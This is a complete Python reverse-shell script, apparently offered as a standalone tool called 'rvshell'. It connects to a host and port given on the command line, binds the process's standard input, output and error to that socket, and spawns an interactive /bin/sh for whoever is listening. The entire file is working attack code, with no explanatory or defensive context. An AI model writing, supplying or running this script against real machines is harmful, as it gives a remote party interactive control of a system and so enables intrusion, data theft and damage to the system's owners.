import sys
import socket
import os
import subprocess
import shlex
import time

RHOST = sys.argv[1] if len(sys.argv) > 1 else None
RPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

if not RHOST:
    print("ERROR: usage: rvshell <host> [port]")
    sys.exit(1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(15)

try:
    s.connect((RHOST, RPORT))
except (socket.timeout, ConnectionRefusedError, OSError) as e:
    print(f"ERROR: connection failed: {e}")
    sys.exit(1)

s.settimeout(None)

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

try:
    import pty
    pty.spawn("/bin/sh")
except ImportError:
    subprocess.call(["/bin/sh", "-i"])

s.close()
